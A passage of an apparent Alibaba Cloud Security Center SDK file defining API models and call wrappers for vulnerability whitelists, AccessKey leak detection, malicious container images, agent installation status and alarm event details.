>  To delete a vulnerability whitelist, you must provide the ID of the whitelist. You can call the [DescribeVulWhitelist](~~DescribeVulWhitelist~~) operation to query the IDs of whitelists.', example='131231'),
  whitelist?: string(name='Whitelist', description='The information about the whitelist. The value is a JSON string that contains the following fields:

*   **Name**: the name of the vulnerability.

*   **Type**: the type of the vulnerability. Valid values:

    *   **cve**: Linux software vulnerability
    *   **sys**: Windows system vulnerability
    *   **cms**: Web-CMS vulnerability
    *   **app**: application vulnerability
    *   **emg**: urgent vulnerability

*   **AliasName**: the alias of the vulnerability.', example='[
      {
            "Name": "oval:com.redhat.rhsa:def:20173263",
            "Type": "cve",
            "AliasName": "RHSA-2017:3263: curl security update"
      }
]'),
}

model DeleteVulWhitelistResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9FBC6E47-7508-58C9-9E76-528E118CB1CC'),
}

model DeleteVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteVulWhitelistResponseBody(name='body'),
}

async function deleteVulWhitelistWithOptions(request: DeleteVulWhitelistRequest, runtime: Util.RuntimeOptions): DeleteVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.whitelist)) {
    query['Whitelist'] = request.whitelist;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteVulWhitelist(request: DeleteVulWhitelistRequest): DeleteVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteVulWhitelistWithOptions(request, runtime);
}

model DescribeAccessKeyLeakDetailRequest {
  id?: long(name='Id', description='The ID of the AccessKey pair leak.', example='389357'),
}

model DescribeAccessKeyLeakDetailResponseBody = {
  accesskeyId?: string(name='AccesskeyId', description='The ID of the AccessKey pair that is leaked.', example='LTAI4G4VjkC9wenfEvgX****'),
  asset?: string(name='Asset', description='The platform to which the asset belongs. The value is fixed as **Cloud platform**.', example='Cloud platform'),
  code?: string(name='Code', description='The code snippet that is leaked.', example='\\n1231 \\nak=LTAI4G4VjkC9wenfEvgX**** \\n12311123 \\nsk1999 \\nsk1999sk1999 \\nsk1999sk1999 \\n\\n\\ntest001 ak hht \\nak=LTAI4G4VjkC9wenfEvgX**** \\nsk=AjEhS9XmnIzllpAx2LxMTMdrTG****'),
  dealTime?: string(name='DealTime', description='The time when the AccessKey pair leak was handled.', example='2022-01-17 15:47:08'),
  dealType?: string(name='DealType', description='The solution to the AccessKey pair leak. Valid values:

*   **manual**: manually deleted
*   **disable**: manually disabled
*   **add-whitelist**: added to the whitelist
*   **pending**: unhandled', example='add-whitelist'),
  githubFileName?: string(name='GithubFileName', description='The name of the GitHub file.', example='testAkLeak'),
  githubFileType?: string(name='GithubFileType', description='The type of the GitHub file. Valid values:

*   Python
*   XML
*   GO
*   Javascript
*   INI
*   JSON
*   C++', example='Python'),
  githubFileUpdateTime?: string(name='GithubFileUpdateTime', description='The time when the GitHub file was updated.', example='2021-07-06T09:49:33'),
  githubFileUrl?: string(name='GithubFileUrl', description='The URL of the GitHub file.', example='https://github.com/Blue00Blue/ExamOnline/blob/6c932c10fc3f217783f3937e2b230f79656c18a7/testAk****'),
  githubRepoName?: string(name='GithubRepoName', description='The name of the GitHub repository.', example='ExamOnline'),
  githubRepoUrl?: string(name='GithubRepoUrl', description='The URL of the GitHub repository.', example='https://github.com/Blue00Blue/ExamOn****'),
  githubUser?: string(name='GithubUser', description='The username of the GitHub user.', example='Blue00Blue'),
  githubUserPicUrl?: string(name='GithubUserPicUrl', description='The URL of the profile picture for the GitHub user.', example='https://avatars.githubusercontent.com/u/26296896?s=48&v=****'),
  gmtCreate?: string(name='GmtCreate', description='The first time when the AccessKey pair leak was detected.', example='2021-07-06 17:49:41'),
  gmtModified?: string(name='GmtModified', description='The last time when the AccessKey pair leak was detected.', example='2021-07-06 17:49:39'),
  remark?: string(name='Remark', description='The remarks of the AccessKey pair leak.', example='12'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  source?: string(name='Source', description='The platform on which the AccessKey pair leak is detected.', example='GitHub'),
  type?: string(name='Type', description='The type of the leak. The value is fixed as **AccessKey**.', example='AccessKey'),
  whitelistStatus?: string(name='WhitelistStatus', description='Indicates whether the AccessKey pair leak is added to the whitelist. Valid values:

*   **no**: The AccessKey pair leak is not added to the whitelist.
*   **yes**: The AccessKey pair leak is added to the whitelist.', example='no'),
}

model DescribeAccessKeyLeakDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAccessKeyLeakDetailResponseBody(name='body'),
}

async function describeAccessKeyLeakDetailWithOptions(request: DescribeAccessKeyLeakDetailRequest, runtime: Util.RuntimeOptions): DescribeAccessKeyLeakDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAccessKeyLeakDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAccessKeyLeakDetail(request: DescribeAccessKeyLeakDetailRequest): DescribeAccessKeyLeakDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAccessKeyLeakDetailWithOptions(request, runtime);
}

model DescribeAccesskeyLeakListRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  query?: string(name='Query'),
  startTs?: long(name='StartTs'),
  status?: string(name='Status'),
}

model DescribeAccesskeyLeakListResponseBody = {
  accessKeyLeakList?: [ 
    {
      accesskeyId?: string(name='AccesskeyId'),
      aliUserName?: string(name='AliUserName'),
      asset?: string(name='Asset'),
      dealTime?: string(name='DealTime'),
      dealType?: string(name='DealType'),
      gmtModified?: long(name='GmtModified'),
      id?: long(name='Id'),
      status?: string(name='Status'),
      type?: string(name='Type'),
      url?: string(name='Url'),
      userType?: string(name='UserType'),
    }
  ](name='AccessKeyLeakList'),
  akLeakCount?: int32(name='AkLeakCount'),
  currentPage?: int32(name='CurrentPage'),
  gmtLast?: long(name='GmtLast'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeAccesskeyLeakListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAccesskeyLeakListResponseBody(name='body'),
}

async function describeAccesskeyLeakListWithOptions(request: DescribeAccesskeyLeakListRequest, runtime: Util.RuntimeOptions): DescribeAccesskeyLeakListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.query)) {
    query['Query'] = request.query;
  }
  if (!Util.isUnset(request.startTs)) {
    query['StartTs'] = request.startTs;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAccesskeyLeakList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAccesskeyLeakList(request: DescribeAccesskeyLeakListRequest): DescribeAccesskeyLeakListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAccesskeyLeakListWithOptions(request, runtime);
}

model DescribeAffectedAssetsRequest {
  current?: string(name='Current', example='1'),
  levels?: string(name='Levels', example='serious,suspicious,remind'),
  pageSize?: string(name='PageSize', example='10'),
}

model DescribeAffectedAssetsResponseBody = {
  assetList?: [ 
    {
      instanceId?: string(name='InstanceId', example='11'),
      instanceName?: string(name='InstanceName', example='11'),
      internetIp?: string(name='InternetIp', example='10.10.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='172.0.XX.XX'),
      riskNum?: int32(name='RiskNum', example='1'),
      uuid?: string(name='Uuid', example='947d7514-258a-4b47-9dde-9dxxxxxxxxxx'),
    }
  ](name='AssetList'),
  pageInfo?: {
    count?: int32(name='Count', example='10'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='100'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42XXXXXXXX'),
}

model DescribeAffectedAssetsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAffectedAssetsResponseBody(name='body'),
}

async function describeAffectedAssetsWithOptions(request: DescribeAffectedAssetsRequest, runtime: Util.RuntimeOptions): DescribeAffectedAssetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.current)) {
    query['Current'] = request.current;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAffectedAssets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAffectedAssets(request: DescribeAffectedAssetsRequest): DescribeAffectedAssetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAffectedAssetsWithOptions(request, runtime);
}

model DescribeAffectedMaliciousFileImagesRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c60b77fe62093480db6164a3c2fa5****'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='minikube'),
  containerId?: string(name='ContainerId', description='The ID of the container.', example='cc20a1024011c44b6a8710d6f8b****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  image?: string(name='Image', description='The name of the container image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****'),
  imageDigest?: string(name='ImageDigest', description='The image digest.', example='6a5e103187b31a94592a47a5858617f7a179ead61df7606****'),
  imageLayer?: string(name='ImageLayer', description='The image layer.', example='27213ad375b53628dd152a5ca****'),
  imageTag?: string(name='ImageTag', description='The tag that is added to the image.', example='0.2'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  levels?: string(name='Levels', description='The severity of the malicious image sample. Separate multiple severities with commas (,). Valid values: serious suspicious remind', example='serious,suspicious'),
  maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious image sample.

>  You can call the [DescribeGroupedMaliciousFiles](~~DescribeGroupedMaliciousFiles~~) operation to query the MD5 hash values of malicious image samples.', example='d836968041f7683b5459****'),
  namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
  repoId?: string(name='RepoId', description='The ID of the image repository.

>  You can call the [ListRepository](~~ListRepository~~) operation to query the IDs of image repositories from the value of the **RepoId** response parameter.', example='crr-vridcl4****'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.

>  You can call the [ListRepository](~~ListRepository~~) operation to query the IDs of container images from the value of the **InstanceId** response parameter.', example='cri-datvailb****'),
  repoName?: string(name='RepoName', description='The name of the image repository.

>  Fuzzy match is supported.', example='centos'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.

>  Fuzzy match is supported.', example='hanghai-namespace'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository. Valid values:

*   **cn-beijing**: China (Beijing)
*   **cn-zhangjiakou**: China (Zhangjiakou)
*   **cn-hangzhou**: China (Hangzhou)
*   **cn-shanghai**: China (Shanghai)
*   **cn-shenzhen**: China (Shenzhen)
*   **cn-hongkong**: China (Hong Kong)
*   **ap-southeast-1**: Singapore
*   **ap-southeast-5**: Indonesia (Jakarta)
*   **us-east-1**: US (Virginia)
*   **us-west-1**: US (Silicon Valley)
*   **eu-central-1**: Germany (Frankfurt)
*   **eu-west-1**: UK (London)
*   **ap-south-1**: India (Mumbai)', example='cn-hangzhou'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
}

model DescribeAffectedMaliciousFileImagesResponseBody = {
  affectedMaliciousFileImagesResponse?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      digest?: string(name='Digest', description='The image digest.', example='6a5e1031a5858617f7d8a179ead6****'),
      downloadUrl?: string(name='DownloadUrl', description='The URL to download the malicious image sample.', example='https://aegis-metadata-file.oss-cn-shanghai.aliyuncs.com/'),
      filePath?: string(name='FilePath', description='The path to the image file.', example='/d836968041f7683b5605a****'),
      firstScanTimestamp?: long(name='FirstScanTimestamp', description='The timestamp of the first scan.', example='1594907349000'),
      highLight?: string(name='HighLight', description='The text that is highlighted.', example='{"ruleVersion":"highlight_20210908","ruleId":600106,"events":[[2,54]]}'),
      image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='e05c0de798217637868ef4****'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      latestScanTimestamp?: long(name='LatestScanTimestamp', description='The timestamp of the last scan.', example='1596522785000'),
      latestVerifyTimestamp?: long(name='LatestVerifyTimestamp', description='The timestamp of the last verification.', example='1596522711000'),
      layer?: string(name='Layer', description='The image layer.', example='27213ad3447f0209dd152a5cadea****'),
      level?: string(name='Level', description='The severity of the malicious image sample. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
      maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious image sample.', example='d836968041f768300d9605a****'),
      namespace?: string(name='Namespace', description='The namespace to which the image repository belongs.', example='hanghai-namespace'),
      pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-vridcl4****'),
      repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.', example='cri-datvail3m****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='centos'),
      repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-shanghai'),
      status?: int32(name='Status', description='The handling status of the malicious image sample. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: verifying
*   **3**: added to the whitelist', example='1'),
      tag?: string(name='Tag', description='The tag that is added to the image.', example='0.2'),
      targetId?: string(name='TargetId'),
      targetName?: string(name='TargetName'),
      targetType?: string(name='TargetType'),
      uuid?: string(name='Uuid'),
    }
  ](name='AffectedMaliciousFileImagesResponse', description='An array consisting of the images that have malicious image samples.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of images that have malicious image samples returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Pages start from page **1**. Default value: **1**.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of images that have malicious image samples.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ACF97412-FD09-4D1F-994F-34DF12BREF20'),
}

model DescribeAffectedMaliciousFileImagesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAffectedMaliciousFileImagesResponseBody(name='body'),
}

async function describeAffectedMaliciousFileImagesWithOptions(request: DescribeAffectedMaliciousFileImagesRequest, runtime: Util.RuntimeOptions): DescribeAffectedMaliciousFileImagesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.containerId)) {
    query['ContainerId'] = request.containerId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.image)) {
    query['Image'] = request.image;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.imageLayer)) {
    query['ImageLayer'] = request.imageLayer;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.maliciousMd5)) {
    query['MaliciousMd5'] = request.maliciousMd5;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pod)) {
    query['Pod'] = request.pod;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAffectedMaliciousFileImages',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAffectedMaliciousFileImages(request: DescribeAffectedMaliciousFileImagesRequest): DescribeAffectedMaliciousFileImagesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAffectedMaliciousFileImagesWithOptions(request, runtime);
}

model DescribeAgentInstallStatusRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.46.XXX.XXX'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers. Separate multiple UUIDs with commas (,).', example='inet-eae014a7-16c4-4d4e-9f03-5208f4dc****,inet-eae047da-1e5a-41ce-828d-47606e9b****'),
}

model DescribeAgentInstallStatusResponseBody = {
  aegisClientInvokeStatusResponseList?: [ 
    {
      message?: string(name='Message', description='The message returned.', example='Installed'),
      resuleCode?: string(name='ResuleCode', description='The result code returned. Valid values:

*   **-1**: The agent is not installed.
*   **0**: The agent is installed.
*   **1**: The directory of the agent failed to be created.
*   **2**: The installation package failed to be downloaded.
*   **3**: The installation file does not exist.
*   **4**: The verification information about the installation file does not exist.
*   **5**: The installation file failed to pass the verification.
*   **6**: The installation file failed to be executed.
*   **7**: The agent failed to be installed because the required permissions are not granted.
*   **8**: No process of the agent was detected.
*   **100**: The agent failed to be installed because an unknown error occurred.
*   **1001**: The agent failed to be installed because the automatic installation of the agent is not supported in the region.
*   **1002**: The agent failed to be installed because the agent cannot be installed on servers outside the cloud. You can install the agent only on supported servers.
*   **1003**: The agent failed to be installed because the operating system type of the server is not supported.
*   **1004**: An internal error occurred. Try again later.
*   **1005**: The Elastic Compute Service (ECS) instance is not running. Start the ECS instance and try again.
*   **1006**: The automatic installation of the agent is not supported on an ECS instance that resides in the classic network.
*   **1007**: The process of the installation command is manually stopped.
*   **1008**: The agent failed to be installed because Cloud Assistant is not installed.
*   **1009**: The execution of the installation command timed out. Try again later.
*   **1010**: The agent on the server is already online. You do not need to install the agent.', example='1'),
      result?: int32(name='Result', description='The installation result. Valid values:

*   **-1**: not installed
*   **0**: being installed
*   **1**: installed
*   **2**: installation failed', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='d123f6ae-9749-4338-8c7f-3c2c1ead****'),
    }
  ](name='AegisClientInvokeStatusResponseList', description='An array that consists of the installation results for the servers.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeAgentInstallStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAgentInstallStatusResponseBody(name='body'),
}

async function describeAgentInstallStatusWithOptions(request: DescribeAgentInstallStatusRequest, runtime: Util.RuntimeOptions): DescribeAgentInstallStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAgentInstallStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAgentInstallStatus(request: DescribeAgentInstallStatusRequest): DescribeAgentInstallStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAgentInstallStatusWithOptions(request, runtime);
}

model DescribeAlarmEventDetailRequest {
  alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The unique ID of the alert event.

>  To query the details of an alert event, you must specify the unique ID of the alert event. You can call the [DescribeAlarmEventList](~~DescribeAlarmEventList~~) operation to query the unique IDs of alert events.', example='9f62555666f177aa84ee1eaf465a****'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
}

model DescribeAlarmEventDetailResponseBody = {
  data?: {
    alarmEventAliasName?: string(name='AlarmEventAliasName', description='The name of the alert event.', example='Login with unusual location'),
    alarmEventDesc?: string(name='AlarmEventDesc', description='The description of the alert event.', example='The detection model finds that self-mutation is running on your server. A self-mutation Trojan is a Trojan horse program with self-mutation function. It will change its hash or copy a large number of itself to different paths, and run in the background to avoid cleaning.'),
    alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The unique ID of the alert event.

>  To query the details about an alert event, you must specify the unique ID of the alert event. You can call the [DescribeAlarmEventList](~~DescribeAlarmEventList~~) operation to query the unique IDs of alert events.', example='9f62555666f177aa84ee1eaf465a****'),
    appName?: string(name='AppName', description='The name of the container application.', example='app:msdp-uat-service'),
    canBeDealOnLine?: boolean(name='CanBeDealOnLine', description='Indicates whether the online handling of the alert event is supported. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
    canCancelFault?: boolean(name='CanCancelFault', description='Indicates whether you can cancel marking the alert event as a false positive. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
    causeDetails?: [ 
      {
        key?: string(name='Key', description='The key that is used to trace the alert event.', example='842e314e69b1a2c45d5c1a2f88a16***'),
        value?: [ 
          {
            name?: string(name='Name', description='The name of the field that displays tracing information.', example='sshd'),
            type?: string(name='Type', description='The type of the field that displays tracing information. Valid values:

*   **text**
*   **html**', example='html'),
            value?: string(name='Value', description='The value of the field that displays tracing information.', example='<p>under a certain small probability, yundun may mistakenly judge the repeated attempts caused by the administrator forgetting or entering the wrong password as successful blasting. Please check according to the account number and time shown in the alarm details. Once it is confirmed that it is not the initiative of the administrator, it is recommended to immediately block the IP, and you can open it at the same time<a href="https://yundun.console.aliyun.com/?p=pam">PAM</a>, hosting host login password, improving remote connection efficiency and security control ability, and according to<a href="https://click.aliyun.com/m/1000226086/">best practice of ECS account security protection</a>Modify login password and convergence asset.</p>↵'),
          }
        ](name='Value', description='An array consisting of the value that is used to trace the alert event.'),
      }
    ](name='CauseDetails', description='An array consisting of the cause of the alert event, which can be used to trace the alert event.'),
    containHwMode?: boolean(name='ContainHwMode', description='Indicates whether the Safeguard Mode For Major Activities mode is enabled.', example='true'),
    containerId?: string(name='ContainerId', description='The ID of the container application.', example='container_1606995441910_394868_01_000***'),
    containerImageId?: string(name='ContainerImageId', description='The ID of the image to which the container belongs.', example='cadb7a725641'),
    containerImageName?: string(name='ContainerImageName', description='The name of the image to which the container belongs.', example='jenkins/jenkins:latest'),
    dataSource?: string(name='DataSource', description='The data source of the alert event.', example='aegis_***'),
    endTime?: long(name='EndTime', description='The timestamp when the alert event ends. Unit: milliseconds.', example='1542366542000'),
    instanceName?: string(name='InstanceName', description='The name of the instance.', example='i-wz92q7m5hsbgfhdss***'),
    internetIp?: string(name='InternetIp', description='The public IP address of the associated instance.', example='172.16.XX.XX'),
    intranetIp?: string(name='IntranetIp', description='The private IP address of the associated instance.', example='172.25.30.**'),
    k8sClusterId?: string(name='K8sClusterId', description='The ID of the Kubernetes cluster.', example='c562cf0d68e9749ee9fe544a7ab2f****'),
    k8sClusterName?: string(name='K8sClusterName', description='The name of the Kubernetes cluster.', example='TestK8sCluser'),
    k8sNamespace?: string(name='K8sNamespace', description='The namespace of the Kubernetes cluster.', example='sit-saic-trip'),
    k8sNodeId?: string(name='K8sNodeId', description='The ID of the Kubernetes cluster node.', example='i-bp14a1ay8e0aa9t0l***'),
    k8sNodeName?: string(name='K8sNodeName', description='The name of the Kubernetes cluster node.', example='cn-hangzhou.10.188.139.**'),
    k8sPodName?: string(name='K8sPodName', description='The name of the Kubernetes pod.', example='myapp-pod'),
    level?: string(name='Level', description='The severity of the alert event. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
    solution?: string(name='Solution', description='The solution to the alert event.', example='An invalid logon source IP has been detected. If you recognize this logon attempt, we recommend that you add the current logon source IP to the valid logon source IP list to avoid future alerts. If you do not recognize this logon attempt, we recommend that you modify the password.'),
    startTime?: long(name='StartTime', description='The timestamp when the alert event starts. Unit: milliseconds.', example='1542378601000'),
    type?: string(name='Type', description='The alert type of the alert event. Valid values:

*   Suspicious process
*   Webshell
*   Unusual logon
*   Exception
*   Sensitive file tampering
*   Malicious process (cloud threat detection)
*   Suspicious network connection
*   Other
*   Abnormal account
*   Application intrusion event
*   Cloud threat detection
*   Precise defense
*   Application whitelist
*   Persistent webshell
*   Web application threat detection
*   Malicious script
*   Threat intelligence
*   Malicious network activity
*   Cluster exception
*   Webshell (on-premises threat detection)
*   Vulnerability exploitation
*   Malicious process (on-premises threat detection)
*   Trusted exception', example='Webshell'),
    uuid?: string(name='Uuid', description='The instance UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
  }(name='Data', description='The details about the alert event.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7EA50837-2F0B-5BCC-AB61-4968D88D75AD'),
}

model DescribeAlarmEventDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAlarmEventDetailResponseBody(name='body'),
}

async function describeAlarmEventDetailWithOptions(request: DescribeAlarmEventDetailRequest, runtime: Util.RuntimeOptions): DescribeAlarmEventDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.alarmUniqueInfo)) {
    query['AlarmUniqueInfo'] = request.alarmUniqueInfo;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAlarmEventDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAlarmEventDetail(request: DescribeAlarmEventDetailRequest): DescribeAlarmEventDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAlarmEventDetailWithOptions(request, runtime);
}

model DescribeAlarmEventListRequest {
